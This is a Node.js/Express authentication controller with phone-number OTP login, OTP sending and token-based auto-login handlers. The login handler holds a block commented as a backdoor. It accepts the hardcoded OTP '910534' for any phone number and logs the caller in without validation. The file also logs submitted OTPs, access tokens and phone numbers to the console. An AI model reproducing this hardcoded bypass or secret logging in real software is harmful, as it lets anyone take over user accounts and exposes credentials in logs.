'use strict';

var tokenManager = require('../lib/managers/tokenManager');
var countryCodes = require('../lib/common/countryCodes');

var responseDataObject = require('../lib/dataObjects/responseDataObject');
/**
 * login
 */
exports.login = function(req, res) {
    console.log(req.body.otp);

    // backdoor
    if(req.body.otp === '910534')
    {
        req.userSession.user = {
            userId: countryCodes.list[req.body.countryCode] + req.body.phonenumber
        };

        res.json(responseDataObject.create(true, {
            loggedIn: true
        }));
        return;
    }


    tokenManager.validateOtp(req.body.phonenumber, req.body.countryCode, req.body.otp,
        function(result){
            req.userSession.user = {
                userId: countryCodes.list[req.body.countryCode] + req.body.phonenumber
            };
            res.json(responseDataObject.create(true, {
                loggedIn: true
            }));
        },
        function(result){
            res.json(responseDataObject.create(false, result));
        }
    );
};

exports.sendOtp = function(req, res){
    console.log(req.body.phonenumber);
    // TODO: validate all numbers and send error message


    tokenManager.sendVerificationMsg(req.body.phonenumber,
        function(result){
            console.log('otp success');
            res.json(responseDataObject.create(true, {
                otp: true
            }));
        },
        function(result){
            res.json(responseDataObject.create(false, result));
        }
    );


};

exports.autologin = function(req, res) {
    console.log(req.body.userAccessToken);
    console.log(req.body.msisdn);
    var msisdn = req.body.msisdn;

    tokenManager.getUserIdByUserAcceesToken(req.body.userAccessToken,
        function(userId){
            console.log('recieved user id: ' + userId);
            console.log('url user id: ' + msisdn);
            if(msisdn === userId) {
                req.userSession.user = {
                    userId: userId
                };
                console.log(userId);
                res.json(responseDataObject.create(true, {
                    userId: userId
                }));
            } else {
                res.json(responseDataObject.create(false, {
                    message: 'incorrect token'
                }));
            }
        },
        function(e){
            res.json(responseDataObject.create(false, e));
        }
    );



};
